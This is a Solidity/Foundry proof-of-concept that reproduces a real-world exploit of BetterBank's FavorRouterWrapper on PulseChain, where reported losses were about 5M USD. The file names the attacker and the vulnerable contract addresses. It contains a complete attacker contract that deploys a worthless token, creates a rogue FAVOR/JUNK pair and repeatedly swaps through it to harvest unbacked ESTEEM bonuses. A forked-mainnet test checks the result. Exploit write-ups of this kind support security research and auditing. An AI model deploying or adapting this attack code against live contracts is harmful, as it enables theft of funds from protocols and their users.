// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost: ~5M USD
// Attacker: https://scan.pulsechain.com/address/0x48c9f537f3f1a2c95c46891332e05da0d268869b
// Attack Tx: https://scan.pulsechain.com/tx/0x74534b1f86a63c6c722d5845f2b4c08867c2e66b922a6c95cd6b4290664c19bd
// Vulnerable Contract: https://scan.pulsechain.com/address/0x30dcc4e72dcd2702449190ce8b88d21f2178cd9c
//
// FavorRouterWrapper treated every PulseX pair containing FAVOR as a valid
// market. An attacker can create a FAVOR/junk-token pair, repeatedly buy FAVOR
// through it to accrue ESTEEM bonuses, then sell back into the same rogue pair.

interface IPulseXRouter {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface IFavorRouterWrapper {
    function swapExactFavorForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForFavorAndTrackBonus(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IFavor is IERC20 {
    function claimBonus() external;
}

contract JunkToken {
    string public constant name = "Worthless Token";
    string public constant symbol = "JUNK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 1_000_000_000 ether;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function approve(
        address spender,
        uint256 amount
    ) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(
        address to,
        uint256 amount
    ) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BetterBankAttacker {
    IPulseXRouter private constant ROUTER = IPulseXRouter(0x165C3410fC91EF562C50559f7d2289fEbed552d9);
    IFavorRouterWrapper private constant WRAPPER = IFavorRouterWrapper(0x30dcC4E72dcD2702449190Ce8B88d21F2178cD9c);
    IFavor private constant FAVOR = IFavor(0x30be72a397667FDfD641E3e5Bd68Db657711EB20);
    IERC20 private constant ESTEEM = IERC20(0xdbB8Fd196E804d05bb8047Dd3e91a9245B7819a7);

    JunkToken public immutable junk;

    constructor() {
        junk = new JunkToken();
    }

    function attack() external {
        FAVOR.approve(address(ROUTER), type(uint256).max);
        FAVOR.approve(address(WRAPPER), type(uint256).max);
        junk.approve(address(ROUTER), type(uint256).max);
        junk.approve(address(WRAPPER), type(uint256).max);

        ROUTER.addLiquidity(
            address(FAVOR), address(junk), 1_000_000 ether, 1_000_000 ether, 0, 0, address(this), block.timestamp
        );

        address[] memory buyPath = new address[](2);
        buyPath[0] = address(junk);
        buyPath[1] = address(FAVOR);
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(FAVOR);
        sellPath[1] = address(junk);

        for (uint256 i; i < 20; ++i) {
            WRAPPER.swapExactTokensForFavorAndTrackBonus(10_000 ether, 0, buyPath, address(this), block.timestamp);
            WRAPPER.swapExactFavorForTokens(FAVOR.balanceOf(address(this)), 0, sellPath, address(this), block.timestamp);
        }
        FAVOR.claimBonus();
    }

    function esteemBalance() external view returns (uint256) {
        return ESTEEM.balanceOf(address(this));
    }
}

contract BetterBankExploitTest is Test {
    address private constant FAVOR = 0x30be72a397667FDfD641E3e5Bd68Db657711EB20;
    uint256 private constant FORK_BLOCK = 24_343_024;

    function setUp() public {
        vm.createSelectFork("https://rpc.pulsechain.com", FORK_BLOCK);
    }

    function testExploit() public {
        BetterBankAttacker attacker = new BetterBankAttacker();
        deal(FAVOR, address(attacker), 1_000_000 ether);

        attacker.attack();

        uint256 unbackedRewards = attacker.esteemBalance();
        emit log_named_decimal_uint("Unbacked ESTEEM minted", unbackedRewards, 18);
        assertGt(unbackedRewards, 0);
    }
}
